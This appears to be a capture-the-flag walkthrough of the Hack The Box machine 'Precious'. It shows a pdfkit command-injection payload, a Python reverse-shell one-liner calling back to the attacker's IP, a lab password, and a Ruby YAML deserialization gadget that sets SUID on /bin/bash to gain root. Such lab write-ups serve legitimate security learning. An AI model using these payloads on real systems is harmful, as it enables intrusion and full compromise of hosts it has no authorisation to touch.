# Precious

<img width="426" alt="Precious" src="https://github.com/Lynk4/HTB-Writeups/assets/44930131/4e1c83a0-a1c9-42c7-a7b8-0cc0bd8d7007">

#### Information Gathering:

We'll begin by enumerating hosts with nmap:

![nmap](https://github.com/Lynk4/HTB-Writeups/assets/44930131/b964baba-0876-4000-93ea-f788bd3a3e86)

The scan shows us that port 22 and port 80 are open. We can also see that port 80 redirects to precious.htb. In order to access the site you will need to add precious.htb to your /etc/hosts file.

Let's check the Website:

![web](https://github.com/Lynk4/HTB-Writeups/assets/44930131/5f705ea3-948b-4e60-b3f3-5ed66d1df607)

The web server appears to provide a service that transforms web pages to PDF files. Let's put this feature to the test.

To achieve this, we'll need to set up a server python on our system for testing purposes:

![pythonwe](https://github.com/Lynk4/HTB-Writeups/assets/44930131/458d259c-03c8-4ffa-a554-9c5fa39a1e7a)

Once your server is up and running, return to precious.htb and input the IP address and port number of your server, then click submit. A pdf file should be downloaded to your PC as intended. This is how mine looks:

![exploit_1](https://github.com/Lynk4/HTB-Writeups/assets/44930131/fdce61a3-bae2-4d6d-a1cb-21bb1e33deff)

Let's check out the properties:

![pdfkit](https://github.com/Lynk4/HTB-Writeups/assets/44930131/b258ea23-12cf-4b22-94df-f145f5a79798)

What's remarkable about this file is that it was created using pdfkit v0.8.6, a PDF document production library. A quick Google search for any known vulnerabilities turns up CVE-2022-25765, indicating that this version of pdfkit is vulnerable to command injections. More information regarding the CVE may be found here:

https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

Now let's test it..by using a pwd command

```
http://10.10.14.12:8000/?name=%20`pwd`
```

![pwd](https://github.com/Lynk4/HTB-Writeups/assets/44930131/e5f4d951-6e6c-4ae7-89a1-bd13d5d643b2)

We got the result....

![web_1](https://github.com/Lynk4/HTB-Writeups/assets/44930131/5bae0def-7764-4f91-8bc5-18d021a832e8)

Now we can now use Python to create our reverse shell. And use the CVE as a guide. Make sure you have a Netcat listener running on your PC to receive the connection.

My payload looks like this:

```
http://10.10.14.12:8000/?name=%20`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4545));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

You should obtain your connection after submitting your payload to the site.

![rev](https://github.com/Lynk4/HTB-Writeups/assets/44930131/df64f3ce-dc7c-4a69-8623-f4f06c619ce9)

Foothold:

As you can see, we were able to access the server as the user ruby. We discover two folders when we navigate to the /home directory. One for our Ruby user and one for a Henry user. A file called user.txt may be found in Henry's directory. That must be our first flag. Unfortunately, we do not currently have access to it.

Looking around a little further, we discover the config file in the /home/ruby/.bundle directory. The password for user Henry is revealed when the contents of config are displayed:

![henry](https://github.com/Lynk4/HTB-Writeups/assets/44930131/a703245d-54ef-463f-b9a4-0a0cd4f999cf)


Using henry’s credentials, let’s try to ssh into the server:
#### henry:Q3c1AqGHtoI0aXAYFH

![ssh_henry](https://github.com/Lynk4/HTB-Writeups/assets/44930131/b9e7cec9-396c-4402-8f32-49ea6e84fbd3)

You may now read the user.txt file and capture the first flag!

![user](https://github.com/Lynk4/HTB-Writeups/assets/44930131/98b34106-d1dd-4ed4-befa-290af7f1f453)

### Privilege Escalation:

Let's explore what we can do now that we're logged in as user henry. To see what we can do with this user account, use:

```
sudo -l
```

![priv](https://github.com/Lynk4/HTB-Writeups/assets/44930131/4c333e08-6154-4d8b-b92e-fd6609ae82be)

Henry appears to be able to run the file update_depencies.rb as root.

It uses YAML.load, which is vulnerable to deserialization attack. You can read more about YAML deserialization attacks here:

https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md

In order for our remote code execution to work, we will need to craft a payload inside a yml file called dependencies.yml. Using the above link, I created the file below on the server, changing the git_set to id:



save it as a dependencies.yml in the remote machine...


```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod u+s /bin/bash
         method_id: :resolve
```

Run the file:

```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
```

And finally run:

```
bash -p
```

You made it to the finish line! Now collect your prize:

![root](https://github.com/Lynk4/HTB-Writeups/assets/44930131/c6cfbeb1-19ce-41fc-8358-553c822cd801)

You just pwned Precious!........
